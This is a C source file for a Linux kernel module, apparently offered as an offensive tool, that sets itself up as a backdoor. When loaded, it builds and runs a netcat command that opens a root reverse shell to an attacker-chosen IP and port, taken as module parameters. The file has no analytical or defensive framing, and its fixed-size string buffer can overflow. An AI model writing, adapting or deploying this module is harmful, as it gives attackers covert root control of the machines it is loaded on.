#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL v3");
MODULE_AUTHOR("CJHackerz");
MODULE_DESCRIPTION("This module pwns your system!");

static char *lhost_ip = "127.0.0.1";
module_param(lhost_ip, charp, 0);
MODULE_PARM_DESC(lhost_ip, "Static IP of attacker's localhost");

static char *lhost_port = "4444";
module_param(lhost_port, charp, 0);
MODULE_PARM_DESC(lhost_port, "listening PORT for reverse shell connection");

static int exec_command(char *bash_command){
	char *argv[] = { "/bin/bash", "-c", bash_command, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int __init start_backdoor(void) {
	unsigned const char *bash_command_parts[2] = {" ", " -e '/bin/sh'' &"};
	char bash_command[47] = "bash -c 'nc ";

	strcat(bash_command, lhost_ip);
	strcat(bash_command, bash_command_parts[0]);
	strcat(bash_command, lhost_port);
	strcat(bash_command, bash_command_parts[1]);

	pr_info("======== Pwning System ========");
	pr_info("Connecting shell on IP: %s and PORT: %s", lhost_ip, lhost_port);
	pr_info("Executing command sequence: %s", bash_command);
	exec_command(bash_command);
	
	return 0;
}

static void __exit stop_backdoor(void) {
	pr_info("===============================\n");
}

module_init(start_backdoor);
module_exit(stop_backdoor);
